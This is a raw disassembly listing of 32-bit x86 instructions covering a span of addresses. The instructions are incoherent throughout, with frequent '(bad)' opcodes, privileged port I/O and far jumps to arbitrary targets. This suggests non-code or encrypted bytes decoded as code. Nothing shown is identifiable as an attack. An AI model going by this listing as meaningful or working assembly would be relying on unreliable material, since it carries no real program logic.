  41c227:	and    dl,BYTE PTR [ebx+0xb0c1666]
  41c22d:	mov    ah,dh
  41c22f:	push   cs
  41c230:	ja     0x41c286
  41c232:	dec    ecx
  41c233:	jmp    0xb6ae:0x83c284d
  41c23a:	scas   al,BYTE PTR es:[edi]
  41c23b:	inc    edi
  41c23c:	push   cs
  41c23d:	jns    0x41c249
  41c23f:	mov    dh,0x33
  41c241:	pop    ecx
  41c242:	mov    esi,0x9711766e
  41c247:	add    eax,0x76234d51
  41c24c:	xor    eax,0xea072042
  41c251:	xchg   ebp,eax
  41c252:	inc    ecx
  41c253:	cdq    
  41c254:	inc    edi
  41c255:	xor    ecx,esp
  41c257:	mov    DWORD PTR [edi+0x323f607],esp
  41c25d:	jnp    0x41c1f4
  41c25f:	sbb    ecx,DWORD PTR [esi+ecx*1-0x50987fa1]
  41c266:	pop    esp
  41c267:	xlat   BYTE PTR ds:[ebx]
  41c268:	loop   0x41c21f
  41c26a:	cmp    BYTE PTR [edx],cl
  41c26c:	xor    al,0x99
  41c26e:	inc    esp
  41c26f:	inc    eax
  41c270:	fstp   QWORD PTR [edx+0x59]
  41c273:	fcom   DWORD PTR [esi+0x3]
  41c276:	nop
  41c277:	cli    
  41c278:	jb     0x41c202
  41c27a:	and    DWORD PTR [edi],ecx
  41c27c:	ror    eax,0x1f
  41c27f:	pusha  
  41c280:	icebp  
  41c281:	fisubr DWORD PTR [ecx+0x5f]
  41c284:	cs aas 
  41c286:	xchg   ebp,eax
  41c287:	jo     0x41c24e
  41c289:	daa    
  41c28a:	shl    BYTE PTR [edx],cl
  41c28c:	sub    al,0xa4
  41c28e:	shl    esi,cl
  41c290:	dec    esi
  41c291:	push   eax
  41c292:	xchg   ecx,eax
  41c293:	ror    BYTE PTR [edx-0x476423b4],1
  41c299:	(bad)  
  41c29a:	pushf  
  41c29b:	and    BYTE PTR [eax],ch
  41c29d:	and    ch,0x78
  41c2a0:	cmp    BYTE PTR [eax-0x1d],bh
  41c2a3:	adc    BYTE PTR [ebp+ecx*4+0x5],cl
  41c2a7:	in     al,dx
  41c2a8:	xchg   esp,eax
  41c2a9:	clc    
  41c2aa:	nop
  41c2ab:	mov    ebp,0x2f691fc4
  41c2b0:	ret    
  41c2b1:	jl     0x41c234
  41c2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2b4:	push   edx
  41c2b5:	mov    BYTE PTR [edx+0x49f9e4d7],0x5
  41c2bc:	jmp    0x8b60db2c
  41c2c1:	and    edx,DWORD PTR [edi]
  41c2c3:	add    al,0xfc
  41c2c5:	push   0x5c
  41c2c7:	fmul   QWORD PTR [eax]
  41c2c9:	cmp    al,0x15
  41c2cb:	pusha  
  41c2cc:	or     DWORD PTR ds:0xca252320,ebp
  41c2d2:	xchg   esi,eax
  41c2d3:	pushf  
  41c2d4:	jge    0x41c2fa
  41c2d6:	jb     0x41c2a4
  41c2d8:	mov    ah,0x62
  41c2da:	(bad)  
  41c2db:	in     eax,dx
  41c2dc:	inc    eax
  41c2dd:	test   eax,0xc4e5530b
  41c2e2:	xor    BYTE PTR [eax-0x186cc55c],bl
  41c2e8:	lahf   
  41c2e9:	scas   eax,DWORD PTR es:[edi]
  41c2ea:	test   BYTE PTR [edi],0x4a
  41c2ed:	fwait
  41c2ee:	lahf   
  41c2ef:	xor    BYTE PTR [ebx+ebx*8+0x587efc2c],cl
  41c2f6:	push   ebp
  41c2f7:	std    
  41c2f8:	sbb    DWORD PTR [ebp-0x5b1e2750],0x2de85282
  41c302:	mov    edi,0xde6e6bf
  41c307:	pop    es
  41c308:	jle    0x41c2fa
  41c30a:	and    ch,BYTE PTR [edx]
  41c30c:	inc    edx
  41c30d:	int3   
  41c30e:	out    0xc1,al
  41c310:	rol    DWORD PTR [ebp+0x73],0x33
  41c314:	inc    edi
  41c315:	pusha  
  41c316:	test   BYTE PTR [esi+0x32],bh
  41c319:	mov    ecx,0xa139234d
  41c31e:	push   es
  41c31f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c320:	push   ebp
  41c321:	push   ebx
  41c322:	adc    bl,dh
  41c324:	bound  edi,QWORD PTR [esi]
  41c326:	ins    BYTE PTR es:[edi],dx
  41c327:	enter  0x6911,0x64
  41c32b:	jne    0x41c37b
  41c32d:	jp     0x41c304
  41c32f:	mov    bl,0xf0
  41c331:	scas   eax,DWORD PTR es:[edi]
  41c332:	and    eax,ecx
  41c334:	mov    WORD PTR [ebx-0x70],?
  41c337:	xchg   esp,eax
  41c338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c339:	inc    ebp
  41c33a:	mov    BYTE PTR [ebx-0x8],dl
  41c33d:	shl    ebx,0xd
  41c340:	loope  0x41c3c0
  41c342:	and    DWORD PTR [eax+0x6f],ebx
  41c345:	add    edx,DWORD PTR [di+0x236b]
  41c34a:	fs xor ebx,edx
  41c34d:	test   eax,0x28103c2c
  41c352:	outs   dx,BYTE PTR ds:[esi]
  41c353:	cmp    DWORD PTR [edx-0x6a],ecx
  41c356:	add    esi,esp
  41c358:	std    
  41c359:	iret   
  41c35a:	ins    DWORD PTR es:[edi],dx
  41c35b:	cmc    
  41c35c:	aam    0xf1
  41c35e:	ficom  WORD PTR [ebx+0x11]
  41c361:	and    esp,DWORD PTR [edi+edx*4]
  41c364:	std    
  41c365:	mov    cl,0xff
  41c367:	fidiv  DWORD PTR [ebp+0x6]
  41c36a:	ficom  DWORD PTR [ebx-0x61037524]
  41c370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c371:	inc    esi
  41c372:	sub    al,0x96
  41c374:	ins    DWORD PTR es:[edi],dx
  41c375:	adc    DWORD PTR [edi+edi*1],esp
  41c378:	adc    al,BYTE PTR [edi+0x4f507c5c]
  41c37e:	jmp    0xf1c95ac1
  41c383:	icebp  
  41c384:	out    0xff,eax
  41c386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c387:	sub    dl,BYTE PTR [esi+0x5d2d8ea3]
  41c38d:	push   eax
  41c38e:	pop    es
  41c38f:	inc    ebp
  41c390:	jg     0x41c3f2
  41c392:	mov    edi,0x1a1bec0d
  41c397:	cli    
  41c398:	mov    ecx,DWORD PTR [edi-0x60ecb322]
  41c39e:	outs   dx,DWORD PTR ds:[esi]
  41c39f:	push   eax
  41c3a0:	mov    ebp,0x30f0125a
  41c3a5:	xor    DWORD PTR [ebp+0x31803c2f],0xfe66d3c8
  41c3af:	jmp    0x2e221a6e
  41c3b4:	rcl    BYTE PTR [eax-0xf31f731],1
  41c3ba:	sbb    BYTE PTR [edi-0x46c86a2d],bl
  41c3c0:	mov    ds:0xbcc0d99,al
  41c3c5:	mov    dh,dh
  41c3c7:	adc    DWORD PTR [ebx+0x18],eax
  41c3ca:	pop    edi
  41c3cb:	cli    
  41c3cc:	sbb    BYTE PTR fs:[ecx+ecx*2-0x4bd5906e],ah
  41c3d4:	fstp   QWORD PTR [esi-0x35]
  41c3d7:	add    DWORD PTR [esi-0x49],edi
  41c3da:	lock stos BYTE PTR es:[edi],al
  41c3dc:	jle    0x41c3a6
  41c3de:	int3   
  41c3df:	aam    0x69
  41c3e1:	jmp    0xe2b9:0x25de59ca
  41c3e8:	lods   eax,DWORD PTR es:[esi]
  41c3ea:	and    al,0x7c
  41c3ec:	imul   eax,DWORD PTR [ebp-0x7f9c083b],0xdcc76aac
  41c3f6:	(bad)  
  41c3f7:	mov    eax,es
  41c3f9:	pop    esp
  41c3fa:	and    al,dh
  41c3fc:	xor    ecx,edx
  41c3fe:	and    ch,bh
  41c400:	dec    eax
  41c401:	std    
  41c402:	addr16 inc ebx
  41c404:	mov    dh,0x3
  41c406:	mov    ds:0xb53e42bb,eax
  41c40b:	adc    al,0x34
  41c40d:	push   ebp
  41c40e:	push   esi
  41c40f:	sbb    BYTE PTR [ecx-0x18],cl
  41c412:	jae    0x41c3f1
  41c414:	jg     0x41c44e
  41c416:	mov    ebx,0xf313c657
  41c41b:	cmc    
  41c41c:	xchg   ecx,eax
  41c41d:	imul   esp,edx,0xa96d9089
  41c423:	mov    dl,0xaa
  41c425:	inc    ebp
  41c426:	inc    eax
  41c427:	inc    ecx
  41c428:	and    ch,BYTE PTR [edx+0x6c]
  41c42b:	xchg   ecx,eax
  41c42c:	adc    dl,BYTE PTR [edx+ebx*2-0x556e5dc1]
  41c433:	retf   
  41c434:	pop    ss
  41c435:	sar    DWORD PTR [ebx+0x3d611317],cl
  41c43b:	mov    BYTE PTR [edi-0x5e],cl
  41c43e:	push   0xffffffb6
  41c440:	scas   eax,DWORD PTR es:[edi]
  41c441:	fs xchg edi,eax
  41c443:	mov    esi,0x98191fdd
  41c448:	jge    0x41c430
  41c44a:	push   ss
  41c44b:	and    al,0xa8
  41c44d:	frstor [ebp+0x5fd24ac0]
  41c453:	loop   0x41c433
  41c455:	out    0x41,eax
  41c457:	push   ebx
  41c458:	sub    DWORD PTR [esi],esi
  41c45a:	rol    DWORD PTR [edx+0x41],1
  41c45d:	mov    BYTE PTR [esi],0xdf
  41c460:	mov    esp,0xff500438
  41c465:	inc    esi
  41c466:	lahf   
  41c467:	pop    esi
  41c468:	in     al,dx
  41c469:	mov    al,0x9d
  41c46b:	adc    eax,0x9db3a4aa
  41c470:	inc    ebx
  41c471:	mov    DWORD PTR [edi+ebx*1+0x67bb8d0b],0x49e26193
  41c47c:	jno    0x41c447
  41c47e:	test   BYTE PTR [esi],dh
  41c480:	dec    ebp
  41c481:	adc    edx,ebp
  41c483:	into   
  41c484:	pop    ss
  41c485:	fs loop 0x41c48d
  41c488:	test   BYTE PTR [esi-0x39],al
  41c48b:	nop
  41c48c:	pop    eax
  41c48d:	pop    ss
  41c48e:	add    esi,0x71c3ae35
  41c494:	dec    edx
  41c495:	push   edx
  41c496:	sub    dh,0x60
  41c499:	xor    eax,0x4707b9e0
  41c49e:	mov    eax,DWORD PTR [ecx+0x3f]
  41c4a1:	add    edx,edx
  41c4a3:	adc    al,0x5d
  41c4a5:	stos   BYTE PTR es:[edi],al
  41c4a6:	(bad)  
  41c4a7:	pop    esi
  41c4a8:	inc    ebp
  41c4a9:	pop    ebp
  41c4aa:	test   eax,0x57f10b7c
  41c4af:	mov    al,ds:0xaf8b6289
  41c4b4:	mov    edx,DWORD PTR [ecx]
  41c4b6:	mov    ch,0xd6
  41c4b8:	mov    esp,0x6e2525c9
  41c4bd:	stos   BYTE PTR es:[edi],al
  41c4be:	jge    0x41c4dd
  41c4c0:	adc    BYTE PTR [ebx+0x38d8a9f2],dh
  41c4c6:	sbb    esp,ecx
  41c4c8:	mov    ss,WORD PTR fs:[di-0x55]
  41c4cd:	xor    al,BYTE PTR [ebp-0x59]
  41c4d0:	bnd jbe 0x41c535
  41c4d3:	jmp    0x63db:0x1e89a87c
  41c4da:	mov    ah,0xe8
  41c4dc:	push   ds
  41c4dd:	not    DWORD PTR [edi+0x76]
  41c4e0:	sub    BYTE PTR [edi],0xb3
  41c4e3:	pop    ebp
  41c4e4:	les    ebx,FWORD PTR [esi+0x183edcc5]
  41c4ea:	mov    esp,0x21ef992b
  41c4ef:	ins    DWORD PTR es:[edi],dx
  41c4f0:	inc    ecx
  41c4f1:	xchg   edi,eax
  41c4f2:	xchg   esi,eax
  41c4f3:	lods   eax,DWORD PTR ds:[esi]
  41c4f4:	mov    al,ds:0x89fe4e42
  41c4f9:	lods   al,BYTE PTR ds:[esi]
  41c4fa:	inc    edx
  41c4fb:	xchg   ebx,eax
  41c4fc:	enter  0xc94f,0x9e
  41c500:	retf   
  41c501:	push   es
  41c502:	hlt    
  41c503:	jae    0x41c4f4
  41c505:	and    DWORD PTR [edx+0x56],edi
  41c508:	ss inc edx
  41c50a:	daa    
  41c50b:	int3   
  41c50c:	xchg   esp,eax
  41c50d:	rcl    BYTE PTR [edi+0x4d3bae11],cl
  41c513:	pusha  
  41c514:	lock sub BYTE PTR [ebx-0x6a],ch
  41c518:	pop    ecx
  41c519:	(bad)  
  41c51a:	pusha  
  41c51b:	dec    eax
  41c51c:	lods   eax,DWORD PTR ds:[esi]
  41c51d:	loop   0x41c543
  41c51f:	mov    al,0xf3
  41c521:	push   edx
  41c522:	xchg   ecx,eax
  41c523:	fst    DWORD PTR [ebx-0x71]
  41c526:	sbb    DWORD PTR [edx+0x1b],esp
  41c529:	inc    esp
  41c52a:	xchg   esp,eax
  41c52b:	adc    eax,0x51bb2b6f
  41c530:	stos   BYTE PTR es:[edi],al
  41c531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c532:	adc    eax,0x192b22e4
  41c537:	mov    WORD PTR [esi+0x2],fs
  41c53a:	push   eax
  41c53b:	adc    dl,BYTE PTR [eax+0x41]
  41c53e:	and    bl,dh
  41c540:	pop    ds
  41c541:	rol    BYTE PTR [edi+0x5e],0x99
  41c545:	(bad)  
  41c547:	int    0x70
  41c549:	movlps xmm0,QWORD PTR [ecx+0x26b86072]
  41c550:	dec    edx
  41c551:	jo     0x41c527
  41c553:	call   0x4783:0xa809daf5
  41c55a:	adc    DWORD PTR [ebp+0x4e92e090],ebx
  41c560:	repz shl esp,0xdc
  41c564:	mov    dh,0x1d
  41c566:	inc    esp
  41c567:	fist   WORD PTR [edi]
  41c569:	dec    esi
  41c56a:	lea    ebp,[ecx]
  41c56c:	stos   DWORD PTR es:[edi],eax
  41c56d:	cwde   
  41c56e:	cmp    DWORD PTR [ebx+0x2626cabb],ebp
  41c574:	mov    cl,0x2e
  41c576:	test   BYTE PTR ds:0xe330ec30,al
  41c57c:	jno    0x41c500
  41c57e:	pop    esp
  41c57f:	lods   al,BYTE PTR ds:[esi]
  41c580:	cli    
  41c581:	pop    edi
  41c582:	inc    eax
  41c583:	test   BYTE PTR [esp+ecx*4-0x11],dl
  41c587:	dec    ecx
  41c588:	lods   eax,DWORD PTR ds:[esi]
  41c589:	mov    bl,0x85
  41c58b:	cwde   
  41c58c:	addr16 sbb eax,0x76a4e299
  41c592:	add    DWORD PTR [esi],esp
  41c594:	jno    0x41c562
  41c596:	test   eax,0x308201e3
  41c59b:	mov    dl,0x87
  41c59d:	jb     0x41c5ba
  41c59f:	div    edi
  41c5a1:	and    DWORD PTR [edi],esi
  41c5a3:	jo     0x41c5df
  41c5a5:	inc    ecx
  41c5a6:	push   0xffffffa2
  41c5a8:	or     eax,0x795a9969
  41c5ad:	mov    bh,0x29
  41c5af:	adc    cl,bl
  41c5b1:	xor    dh,ch
  41c5b3:	ds loopne 0x41c5fd
  41c5b6:	add    eax,0x12e87efa
  41c5bb:	out    0x58,al
  41c5bd:	aad    0xe6
  41c5bf:	mov    al,0x2
  41c5c1:	mov    ebp,ebp
  41c5c3:	test   al,0x6b
  41c5c5:	mov    edx,0x9812ca63
  41c5ca:	add    ecx,esi
  41c5cc:	push   ecx
  41c5cd:	stc    
  41c5ce:	out    dx,al
  41c5cf:	sub    BYTE PTR [edi],0xa7
  41c5d2:	mov    BYTE PTR [esi-0x1e7d5fd6],al
  41c5d8:	in     al,dx
  41c5d9:	call   0x1a48ad6a
  41c5de:	out    dx,al
  41c5df:	div    edx
  41c5e1:	cmc    
  41c5e2:	adc    eax,0x5f4a9d7
  41c5e7:	jbe    0x41c643
  41c5e9:	push   edi
  41c5ea:	jo     0x41c66a
  41c5ec:	and    ecx,DWORD PTR [ebx+edi*1+0x5a49ba13]
  41c5f3:	dec    ecx
  41c5f4:	test   DWORD PTR [eax+0x1473c9c],edi
  41c5fa:	push   es
  41c5fb:	jle    0x41c66b
  41c5fd:	les    ecx,FWORD PTR [ecx-0x10a9d31d]
  41c603:	adc    eax,DWORD PTR [edi+0x34]
  41c606:	pop    ss
  41c607:	jge    0x41c5e1
  41c609:	and    BYTE PTR [edi-0x6e],al
  41c60c:	jbe    0x41c640
  41c60e:	pop    ds
  41c60f:	xor    dh,bl
  41c611:	push   0x3
  41c613:	sub    al,0x92
  41c615:	mov    eax,ds:0xac56ea20
  41c61a:	icebp  
  41c61b:	outs   dx,DWORD PTR ds:[esi]
  41c61c:	lods   eax,DWORD PTR ds:[esi]
  41c61d:	inc    ebp
  41c61e:	or     al,0x7d
  41c620:	pop    ebp
  41c621:	ins    BYTE PTR es:[edi],dx
  41c622:	push   es
  41c623:	sbb    BYTE PTR [eax+edi*1-0x2c],0x70
  41c628:	stos   BYTE PTR es:[edi],al
  41c629:	loop   0x41c5f8
  41c62b:	inc    edi
  41c62c:	je     0x41c68c
  41c62e:	jmp    0x41c655
  41c630:	sub    dl,BYTE PTR [edx]
  41c632:	jmp    0x41c61e
  41c634:	cmp    DWORD PTR [edi],eax
  41c636:	jecxz  0x41c699
  41c638:	inc    edi
  41c639:	lds    edi,FWORD PTR [eax+0x31]
  41c63c:	xchg   edi,eax
  41c63d:	pop    ds
  41c63e:	arpl   WORD PTR [ebx*1-0xa68b124],ax
  41c645:	mov    dh,0x63
  41c647:	pop    ecx
  41c648:	or     eax,DWORD PTR [edx]
  41c64a:	lea    ebp,[eax-0x49]
  41c64d:	dec    ecx
  41c64e:	out    dx,eax
  41c64f:	in     al,dx
  41c650:	cmp    BYTE PTR [edx+0x66ac6b4c],bl
  41c656:	pop    edi
  41c657:	aas    
  41c658:	mov    WORD PTR [edi-0x4ee9bf0f],?
  41c65e:	mov    dh,0xde
  41c660:	adc    DWORD PTR [ebx-0x20],0xffffffbf
  41c664:	and    esi,DWORD PTR [ecx+eax*1+0x1a19e79a]
  41c66b:	mov    edx,0x2af780c5
  41c670:	sub    DWORD PTR [edi+0x2d],0xffffffbb
  41c674:	ja     0x41c61f
  41c676:	fstp   TBYTE PTR [esi+0x4a08e23e]
  41c67c:	(bad)  
  41c67d:	jns    0x41c64f
  41c67f:	int3   
  41c680:	mov    ds:0x832c56b3,al
  41c685:	daa    
  41c686:	ret    0xbf61
  41c689:	push   0xc5cbb3cd
  41c68e:	and    edi,DWORD PTR [ebx+0x4e]
  41c691:	inc    ecx
  41c692:	push   ecx
  41c693:	jg     0x41c687
  41c695:	push   0x17
  41c697:	in     al,dx
  41c698:	inc    edi
  41c699:	mov    DWORD PTR [eax-0x300ca638],ebx
  41c69f:	mov    al,ds:0x44f23c27
  41c6a4:	mov    edx,0xeabaa9e3
  41c6a9:	in     eax,0xc8
  41c6ab:	sub    DWORD PTR [edi+0x17a5b2a9],esp
  41c6b1:	jmp    0xd81d:0x48ea237a
  41c6b8:	xchg   edi,eax
  41c6b9:	pop    ds
  41c6ba:	cdq    
  41c6bb:	imul   ebp,eax,0x6efcc6e4
  41c6c1:	inc    edi
  41c6c2:	stos   BYTE PTR es:[edi],al
  41c6c3:	push   ss
  41c6c4:	daa    
  41c6c5:	cli    
  41c6c6:	shl    ch,0x82
  41c6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6ca:	outs   dx,DWORD PTR ds:[esi]
  41c6cb:	sub    eax,0xe6c47f5c
  41c6d0:	jge    0x41c6c2
  41c6d2:	dec    ebp
  41c6d3:	mov    bh,0x2d
  41c6d5:	popf   
  41c6d6:	sub    bh,al
  41c6d8:	mov    ebp,0xb265d4eb
  41c6dd:	adc    ebp,DWORD PTR [edi+0x4b]
  41c6e0:	loop   0x41c718
  41c6e2:	push   eax
  41c6e3:	adc    DWORD PTR [edx+0x35],edi
  41c6e6:	test   ebp,ebp
  41c6e8:	fwait
  41c6e9:	cwde   
  41c6ea:	js     0x41c748
  41c6ec:	pop    ss
  41c6ed:	or     eax,0xf7f711eb
  41c6f2:	adc    ecx,DWORD PTR gs:[eax-0x7a]
  41c6f6:	jg     0x41c757
  41c6f8:	sbb    esp,DWORD PTR [esi-0x79]
  41c6fb:	ins    DWORD PTR es:[edi],dx
  41c6fc:	lods   al,BYTE PTR ds:[esi]
  41c6fd:	popa   
  41c6fe:	jmp    0x356:0xa424970f
  41c705:	dec    ebx
  41c706:	addr16 pop eax
  41c708:	xor    al,0x6d
  41c70a:	imul   esp,ebx,0xfffffff1
  41c70d:	jae    0x41c6f0
  41c70f:	in     eax,dx
  41c710:	mov    ebx,0xd2d93931
  41c715:	fbld   TBYTE PTR [edx+0x1adc640d]
  41c71b:	lods   al,BYTE PTR ds:[esi]
  41c71c:	xor    BYTE PTR [ebx-0x5c],0x88
  41c720:	pop    ebx
  41c721:	ins    DWORD PTR es:[edi],dx
  41c722:	loop   0x41c710
  41c724:	dec    esi
  41c725:	pop    es
  41c726:	xor    ebp,eax
  41c728:	sub    dh,BYTE PTR [eax+0x3211950]
  41c72e:	loopne 0x41c736
  41c730:	and    ah,BYTE PTR [esi]
  41c732:	sbb    bh,dh
  41c734:	pop    ebx
  41c735:	lods   eax,DWORD PTR ds:[esi]
  41c736:	push   edi
  41c737:	mov    ebp,0x6913f13d
  41c73c:	lods   al,BYTE PTR ds:[esi]
  41c73d:	(bad)  
  41c73e:	and    dh,BYTE PTR [edi]
  41c740:	fdivr  QWORD PTR [esi]
  41c742:	repz clc 
  41c744:	lods   al,BYTE PTR ds:[esi]
  41c745:	xlat   BYTE PTR ds:[ebx]
  41c746:	fdiv   QWORD PTR [ecx-0x4b]
  41c749:	jmp    0x3570:0x6f4a6aa9
  41c750:	sti    
  41c751:	out    0x33,eax
  41c753:	cmc    
  41c754:	aad    0xb6
  41c756:	jmp    0x88e26de0
  41c75b:	pusha  
  41c75c:	jns    0x41c7c5
  41c75e:	sahf   
  41c75f:	call   0xf74491ee
  41c764:	call   0x1a2:0x8238121a
  41c76b:	sti    
  41c76c:	xor    edi,edi
  41c76e:	dec    ebx
  41c76f:	or     eax,0x3c1355e7
  41c774:	and    dh,BYTE PTR [esi]
  41c776:	jns    0x41c76d
  41c778:	and    al,0x1
  41c77a:	fidivr DWORD PTR ds:[esi]
  41c77d:	dec    esi
  41c77e:	rcl    BYTE PTR [ecx+0x59dfd4d0],1
  41c784:	fbld   TBYTE PTR [edx-0x1a]
  41c787:	xchg   edi,eax
  41c788:	cmp    al,0x2
  41c78a:	and    ecx,DWORD PTR [esp+edi*1-0x561cf2ad]
  41c791:	clc    
  41c792:	jge    0x41c7e9
  41c794:	ds sahf 
  41c796:	adc    BYTE PTR [ebx],0x4c
  41c799:	sahf   
  41c79a:	push   esp
  41c79b:	popa   
  41c79c:	mov    al,0xb9
  41c79e:	push   eax
  41c79f:	mov    bl,0x4
  41c7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7a2:	pushf  
  41c7a3:	lods   al,BYTE PTR ds:[esi]
  41c7a4:	dec    edx
  41c7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7a6:	mov    BYTE PTR [edx-0x35e08dce],bl
  41c7ac:	sti    
  41c7ad:	ss call 0x16c6:0x79f3865e
  41c7b5:	add    ebp,eax
  41c7b7:	sbb    BYTE PTR [eax+0x34],0xaa
  41c7bb:	xor    BYTE PTR [edx+0x21a584ed],cl
  41c7c1:	add    al,BYTE PTR [edx-0x4cd910f9]
  41c7c7:	cli    
  41c7c8:	or     DWORD PTR [esi],edi
  41c7ca:	ret    0xf8db
  41c7cd:	pop    ds
  41c7ce:	xchg   edx,eax
  41c7cf:	pop    ebp
  41c7d0:	mov    esp,0x4dfbb57b
  41c7d5:	(bad)  
  41c7d6:	sbb    bh,al
  41c7d8:	mov    edx,0xe741e692
  41c7de:	xor    eax,0x1d86de74
  41c7e3:	pop    es
  41c7e4:	in     al,0x4f
  41c7e6:	jmp    0x41c7e0
  41c7e8:	cwde   
  41c7e9:	test   BYTE PTR [eax-0xf],bl
  41c7ec:	inc    eax
  41c7ed:	or     edi,DWORD PTR [edx-0x74]
  41c7f0:	adc    al,0xd1
  41c7f2:	pop    ds
  41c7f3:	out    dx,eax
  41c7f4:	fadd   st(7),st
  41c7f6:	stos   DWORD PTR es:[edi],eax
  41c7f7:	lahf   
  41c7f8:	mov    gs,WORD PTR [ecx]
  41c7fa:	push   edx
  41c7fb:	push   0x6e
  41c7fd:	mov    bl,0x6
  41c7ff:	dec    esp
  41c800:	fisttp QWORD PTR [edx+0x50]
  41c803:	lock retf 
  41c805:	stos   BYTE PTR es:[edi],al
  41c806:	stos   DWORD PTR es:[edi],eax
  41c807:	jbe    0x41c84f
  41c809:	sub    DWORD PTR [ebx],esp
  41c80b:	aam    0xc6
  41c80d:	fist   DWORD PTR [ecx-0x5a]
  41c810:	mov    ecx,0xac8871b2
  41c815:	jge    0x41c7b5
  41c817:	and    BYTE PTR [edx],0x46
  41c81a:	mov    WORD PTR [edx+0x3],?
  41c81d:	test   al,0x37
  41c81f:	xor    al,0x71
  41c821:	mov    ebp,0x2ab6d9f5
  41c826:	inc    esp
  41c827:	adc    DWORD PTR [edi+0x78],edx
  41c82a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c82b:	adc    al,0x56
  41c82d:	adc    eax,0xa37dc556
  41c832:	and    al,0xdc
  41c834:	fbstp  TBYTE PTR [ebx+0x51]
  41c837:	sahf   
  41c838:	jae    0x41c8ae
  41c83a:	leave  
  41c83b:	aad    0x70
  41c83d:	sahf   
  41c83e:	ja     0x41c887
  41c840:	dec    esi
  41c841:	stos   BYTE PTR es:[edi],al
  41c842:	add    eax,0xd7d2863c
  41c847:	xchg   ebp,eax
  41c848:	cdq    
  41c849:	mov    edi,0x89e9f998
  41c84e:	data16 add al,0x2e
  41c851:	mov    al,ds:0x4b640a54
  41c856:	push   0xd9c20ea7
  41c85b:	out    0xac,eax
  41c85d:	mov    al,0xb5
  41c85f:	push   ds
  41c860:	js     0x41c8d8
  41c862:	repnz adc edx,ebx
  41c865:	rol    BYTE PTR [edx+0x72],1
  41c868:	push   esi
  41c869:	or     BYTE PTR [edi+0x283f6218],bl
  41c86f:	cs mov edi,0xf280ff02
  41c875:	aaa    
  41c876:	fiadd  WORD PTR [edx+0x286d0754]
  41c87c:	mul    ebx
  41c87e:	push   ds
  41c87f:	jae    0x41c8c0
  41c881:	fcmovb st,st(6)
  41c883:	push   0x2a0e4a6c
  41c888:	and    bl,BYTE PTR [edx]
  41c88a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c88b:	cmc    
  41c88c:	xor    al,0x13
  41c88e:	inc    ebp
  41c88f:	cpuid  
  41c891:	mov    edi,0x9ea3514e
  41c896:	mov    ebp,0x477c8087
  41c89b:	push   ebp
  41c89c:	fld    TBYTE PTR [eax+eax*1+0x29]
  41c8a0:	bound  eax,QWORD PTR [esp+ebp*8]
  41c8a3:	ja     0x41c861
  41c8a5:	xchg   esi,eax
  41c8a6:	jp     0x41c85f
  41c8a8:	or     esi,ebp
  41c8aa:	mov    ecx,esi
  41c8ac:	iret   
  41c8ad:	retf   
  41c8ae:	push   edi
  41c8af:	in     al,0xd2
  41c8b1:	scas   al,BYTE PTR es:[edi]
  41c8b2:	cli    
  41c8b3:	add    eax,0x45e68f3d
  41c8b8:	fmul   QWORD PTR [eax-0x1c]
  41c8bb:	push   0x6f6bf278
  41c8c0:	ret    0x85
  41c8c3:	sti    
  41c8c4:	and    ah,BYTE PTR [ebx+ebx*1]
  41c8c7:	dec    eax
  41c8c8:	jb     0x41c8ff
  41c8ca:	hlt    
  41c8cb:	adc    ebp,DWORD PTR [esi-0x499d0f77]
  41c8d1:	(bad)  
  41c8d2:	fistp  WORD PTR [ecx]
  41c8d4:	pusha  
  41c8d5:	jmp    0x2d782941
  41c8da:	sahf   
  41c8db:	mov    edi,0x294f12d9
  41c8e0:	xchg   esi,eax
  41c8e1:	neg    ebp
  41c8e3:	inc    eax
  41c8e4:	stos   BYTE PTR es:[edi],al
  41c8e5:	rcr    DWORD PTR [esi-0x4f46f3bc],1
  41c8eb:	sbb    ecx,edx
  41c8ed:	mov    ebp,eax
  41c8ef:	loop   0x41c8b2
  41c8f1:	add    eax,0x8fa01f73
  41c8f6:	push   0x45
  41c8f8:	pop    esp
  41c8f9:	repz mov ah,0xb5
  41c8fc:	inc    ebp
  41c8fd:	cmp    dh,BYTE PTR [eax+0x101b18fe]
  41c903:	mov    ds:0xb2f3e2e3,al
  41c908:	adc    edi,DWORD PTR [edi+0x1e18c75c]
  41c90e:	out    0xfc,eax
  41c910:	(bad)  
  41c911:	scas   al,BYTE PTR es:[edi]
  41c912:	add    ebp,edx
  41c914:	(bad)  
  41c915:	nop
  41c916:	popa   
  41c917:	div    esp
  41c919:	mov    eax,0x1e284918
  41c91e:	in     eax,0x42
  41c920:	repnz dec ecx
  41c922:	div    DWORD PTR [eax-0x73c1bc4c]
  41c928:	dec    eax
  41c929:	in     al,dx
  41c92a:	push   edx
  41c92b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c92c:	pusha  
  41c92d:	mov    ds:0x2c84a3f0,eax
  41c932:	lods   eax,DWORD PTR ds:[esi]
  41c933:	ss mov ecx,0x6155078a
  41c939:	push   ebx
  41c93a:	xchg   ebp,eax
  41c93b:	jg     0x41c8ef
  41c93d:	sub    DWORD PTR [esi-0x6d8f2904],eax
  41c943:	pusha  
  41c944:	shl    DWORD PTR [edx],cl
  41c946:	mov    cl,0xcf
  41c948:	sub    al,0xc8
  41c94a:	pop    edi
  41c94b:	mov    ds:0xb19ef4b1,eax
  41c950:	imul   eax,DWORD PTR [edi+0x4],0xffffffa0
  41c954:	mov    ch,0x3e
  41c956:	cmp    cl,BYTE PTR [ebx+ebx*8]
  41c959:	ror    BYTE PTR [esi-0x1b],cl
  41c95c:	sub    ecx,DWORD PTR [ebx]
  41c95e:	jmp    0x35eede98
  41c963:	pop    eax
  41c964:	imul   ecx,DWORD PTR [esi-0x7c],0xce94c6da
  41c96b:	mov    ebp,0xe115462b
  41c970:	(bad)  
  41c971:	iret   
  41c972:	mov    edi,es
  41c974:	ror    BYTE PTR [eax+0x34e861d9],cl
  41c97a:	push   eax
